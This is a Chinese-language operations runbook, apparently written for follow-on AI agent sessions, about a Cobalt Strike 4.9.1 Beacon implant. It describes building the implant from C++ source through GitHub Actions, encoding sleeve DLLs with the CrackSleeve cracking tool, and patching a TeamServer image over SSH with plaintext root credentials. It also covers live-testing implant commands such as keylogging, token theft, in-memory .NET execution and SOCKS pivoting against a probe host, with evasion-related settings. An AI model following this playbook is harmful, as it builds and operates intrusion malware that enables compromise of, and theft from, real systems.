# 构建、套筒、TeamServer、活测规范

给后续会话直接照做。路径以本机 `C:\Users\Administrator\Desktop\cobaltstrike` 为准。

---

## 1. 硬约束

- **本机不编 C++**。改完 commit + push，等 GitHub Actions。不要在本机装 VS 去编。
- 只动分支 **`4.9.1`**。`main` 保持 4.5 基线。
- 仓库：`https://github.com/bXZb/Beacon.git`（公开）。
- PAT：`C:\Users\Administrator\Desktop\cobaltstrike\GITHUB_PERSONAL_ACCESS_TOKEN.txt`。**禁止**写入 `.git/config`、禁止出现在 commit、禁止 `git remote set-url` 带 token。
- GitHub 走代理 `http://127.0.0.1:10808`（直连会 reset）。
- 活测判定：OUTPUT / ALT / PS / LS / 文件，**不要**只认 TASKED。
- 用户杀掉的 Headless 会话，未经允许不要再拉起来。
- PowerShell 5.1：含中文的 `.ps1` 必须 UTF-8 **带 BOM**，否则当 GBK 解析。
- 写文件再跑脚本；不要 `python -c` 里塞反斜杠正则（bash 工具会吃掉 `\`）。

---

## 2. 推送并跑 GitHub Actions

仓库根：`CobaltStrikeBeaconCppSource-main`。

```powershell
Set-Location C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main
$env:https_proxy  = 'http://127.0.0.1:10808'
$env:http_proxy   = 'http://127.0.0.1:10808'
$tok = (Get-Content -Raw ..\GITHUB_PERSONAL_ACCESS_TOKEN.txt).Trim()
git push "https://x-access-token:${tok}@github.com/bXZb/Beacon.git" 4.9.1
```

查最近一次 run（同样带 proxy + Bearer）：

```powershell
$h = @{ Authorization = "Bearer $tok"; 'User-Agent' = 'beacon-ops' }
Invoke-RestMethod -Headers $h -Uri 'https://api.github.com/repos/bXZb/Beacon/actions/runs?branch=4.9.1&per_page=5'
```

必须等 **`dll` / `dll-x86` / `tests` 全绿** 再套筒。刚结束的 job log 可能 404 约一分钟，重试或下 `.../runs/{id}/logs` zip。

### 2.1 下载 artifact

浏览器：`https://github.com/bXZb/Beacon/actions/runs/<id>` → `beacon-x86` / `beacon-x64` / `beacon-winhttp-x64`。

API（zip 解到仓库外 `ci-artifacts\<runid>\`，已 gitignore）：

```
GET /repos/bXZb/Beacon/actions/runs/<id>/artifacts
GET /repos/bXZb/Beacon/actions/artifacts/<artifact_id>/zip
```

x86 产物路径：`Win32/Release/beacon.dll`（zip 里可能带目录）。明文必须 **≤ 247808**。

---

## 3. CrackSleeve 编码

4.9.1 TS 是 GraalVM `TeamServerImage`，套筒在镜像里，**不是** jar 的 `sleeve/`。交付 = 明文 DLL → CrackSleeve encode（+32B XOR）→ 覆盖镜像 blob + 长度 4 字节。

目录：`C:\Users\Administrator\Desktop\cobaltstrike\4.9.1\CrackSleeve4.9\`

| 套筒 | Decode 文件 | 明文 cap | 编码 cap |
|---|---|---|---|
| x86 wininet | `Resource\Decode\sleeve\beacon.dll` | 247808 | 247840 |
| x64 wininet | `Resource\Decode\sleeve\beacon.x64.dll` | 307200 | 307232 |
| x64 winhttp | `Resource\Decode\sleeve\winhttpb.x64.dll` | 309248 | 309280 |

```powershell
# 推荐：统一入口（见 §4）
python C:\Users\Administrator\Desktop\cobaltstrike\cs-agscript-mcp\scripts\patch_ts.py --slot x86 --dll <beacon.dll> --encode --restart --profile r2_nosm

# 只编码 x86（encode_beacon_x86.ps1 会取 ci-artifacts 里最新 beacon.dll）
powershell -NoProfile -File C:\Users\Administrator\Desktop\cobaltstrike\cs-agscript-mcp\scripts\encode_beacon_x86.ps1
```

**禁止** `java ... CrackSleeve encode | Select-Object -First 1`：管道会把编码结果吃成 0 字节。让 Java 自己写 `Resource\Encode\...`。

JDK：`C:\Program Files\Java\jdk-21.0.12\bin\java.exe`，`-cp cobaltstrike-client.jar;.`，工作目录必须是 `CrackSleeve4.9`。

---

## 4. Patch TeamServer（`patch_ts.py`）

脚本：`cs-agscript-mcp/scripts/patch_ts.py`。SSH 到 `192.168.100.98` root/`password`，改 `/root/4.9.1/TeamServerImage_patched`。

槽位（编码 blob，长度在 slot-4）：

| `--slot` | VA | 编码 cap | 备份后缀 | 远端临时名 |
|---|---|---|---|---|
| `x86` | `0x054968E0` | 247840 | `.pre_beacon_x86` | `/tmp/beacon.dll.enc` |
| `x64` | `0x04B40EE0` | 307232 | `.pre_beacon_x64` | `/tmp/beacon.x64.dll.enc` |
| `winhttp` | `0x05624CC0` | 309280 | `.pre_winhttpb` | `/tmp/winhttpb.x64.dll.enc` |

```powershell
# 编码 + 写入 x86 槽 + 用 r2_nosm.profile 重启 TS
python ...\patch_ts.py --slot x86 --dll C:\path\beacon.dll --encode --restart --profile r2_nosm

# 已编码文件直接打槽
python ...\patch_ts.py --slot x86 --dll C:\...\CrackSleeve4.9\Resource\Encode\sleeve\beacon.dll --restart --profile r2_nosm

# 只重启（改完 profile、或 Headless 掉线后需要新 TS）
python ...\patch_ts.py --restart-only --profile r2_nosm
```

`--profile` 对应 `cs-agscript-mcp/scripts/` 下文件，会上传成 `/root/4.9.1/<name>.profile`：

- `r2_nosm`：wininet、`sleep_mask false`、`syscall_method "Direct"`（x86 活测默认）
- `r2_winhttp`：WinHTTP 套筒
- `r2_hostprof`：Host Profiles

重启 TS **会踢掉所有 Headless**。打完套筒再开 agscript，不要先开再打。

底层仍可用旧脚本：`patch_beacon_x86_slot.py`（跑在 TS 上）、`apply_beacon_x86_sleeve.py`、`apply_winhttpb_sleeve.py`。新工作用 `patch_ts.py`。

SSL `-Djavax.net.ssl.keyStore=./cobaltstrike.store` 四个 `-D` 不能少，否则 fingerprint NPE。监听 IP 用 **LAN `192.168.100.98`**，不要 `127.0.0.1`。`mv` 覆盖正在跑的镜像会丢掉 exec bit，脚本里 `chmod +x`。

---

## 5. Headless Aggressor 矩阵

### 5.1 启动

```powershell
$jar  = 'C:\Users\Administrator\Desktop\4.9.1\out\artifacts\4.9.1.jar'
$java = 'C:\Program Files\Java\jdk-21.0.12\bin\java.exe'
$cna  = 'C:\Users\Administrator\Desktop\cobaltstrike\cs-agscript-mcp\scripts\headless_drive.cna'
& $java -XX:+AggressiveHeap -XX:+UseParallelGC -cp $jar aggressor.headless.Start `
  192.168.100.98 50050 grok-hlXX 123456 $cna
```

- 用户名每次换 `grok-hl*`，不要和 GUI 抢同一个。
- CNA 轮询 `scripts\r1_inbox.txt`，一行：`CMD\targ1\targ2...`（真正的 TAB）。
- 日志 `r1.log`：`TIME\tTYPE\tBID\tTEXT`。
- `wait()` 用**字符下标**且 `newline=""`。Windows 日志是 `\r\n`，按行 split 会让 pos 错位。

### 5.2 驱动脚本

Python 写 inbox、读 `r1.log`。可复用：

| 脚本 | 用途 |
|---|---|
| `r1_drive.py` / `r2_drive.py` | 早期 x64 矩阵 |
| `c1_x86_matrix.py` | x86 核心矩阵（改脚本里的 CHILD bid） |
| `c1_x86_cmd117.py` | 新 spawn x86 再跑 cmd 117 |
| `c1_x86_cmd117_child.py` | 已有 x86 子会话只跑 117 |
| `b3_cmd117_live.py` | x64 父会话 cmd 117 对照 |
| `c1_x64_ea_live.py` | Defender 关闭后的 x64 EA 回归 |

inbox 命令（见 `headless_drive.cna` `run_cmd`）：`target` `dump` `pick` `spawn` `pwd` `ls` `shell` `ps` `getuid` `steal_token` `rev2self` `syscall_method` `clipboard` `inline_execute` `data_store_load` `data_store_list` `execute_assembly` `upload` `download` `screenshot` `keylogger` `socks` `sleep` `exit` `listener_create` …

`data_store_load` 的 type：BOF 用文件本身；EA 用 `dotnet` + `ea\hello.exe`。命中 store 后 `execute_assembly` 才走 **cmd 117**（日志 `Executing the .NET program from Data Store`）。未命中则走普通 70/71/87/88。

### 5.3 判定

```
PASS: 日志里有 OUTPUT/ALT/PS/LS 且含预期针（如 grok-ea-117）
FAIL: 只有 TASKED；或 lastf 从 Ns 变成 Nm 且后续 pwd 无 OUTPUT
```

`ps` 压缩格式分隔符是字面量 `t` / `n`，不是 tab/newline。

Guardrails 字段必须真正的 tab（CNA 里 `URLDecoder.decode("%09")`）。Sleep `replace("|")` 是正则，会拆错字段。

SOCKS 绑在 **TeamServer** `192.168.100.98`，不是 Headless 那台 Windows。UDP ASSOCIATE 的 DST.PORT = 本机 UDP 源端口。

### 5.4 常用环境

| 项 | 值 |
|---|---|
| TS | `192.168.100.98:50050` 密码 `123456`；HTTP 8080 |
| 探针 | `192.168.100.198` `DESKTOP-4CPCB7A` |
| 优先保活的 x64 父 | `1403836542`（若仍在：x64 `beacon_x64.exe`） |
| hello.exe | `cs-agscript-mcp/scripts/ea/hello.exe` → stdout `grok-ea-117` |

生成 x86 payload 时 TS 可能打 `new string table not found` / `setExportName() failed`：MalleablePE 警告，**只要 INITIAL 出来就不是生成失败**。

---

## 6. 改 implant 时不要做的事

排查 cmd 117 已证明无效、且已从树里删除：

- `src/x86trace.h` / HKCU `Software\x86bc`
- `%TEMP%\x86ea.txt` / `Public\x86ea.txt`
- `BeaconOutput` sendNow + `http_flush_post`（GET 后 `connect_h` 不能用；close+init 仍无 OUTPUT）
- x86 挂起进程 skip CRT / RtlCreateUserThread / APC-s
- SetThreadContext 忽略 `lpParameter` 只改 EAX
- job 超时 `TerminateProcess` 代替 `pipe_try`

需要面包屑时：用已有 job 回调，或 `post_error_dd` 一次（走下一轮 POST）。不要再开 `http_flush_post`。

**保留的真修复**：`GargleSleep` 16KB 堆分配（x86 `__chkstk`）。

---

## 7. 文档索引

| 文件 | 内容 |
|---|---|
| `docs/MATRIX.md` | 当前功能/矩阵完成度 |
| `docs/CMD117-X86-HANDOFF.md` | x86 cmd 117 接手说明 |
| `docs/CMD117-X86-FEEDBACK.md` | 接手会话写回这里 |
| `docs/LIVE-HTTP-X64.md` | x64 活测原始结论（§9 x86 掉线是过时记录） |
| `docs/BUILD.md` | MSVC/CI 工程 |
| `docs/WIRE-PROTOCOL.md` | 线缆协议 |
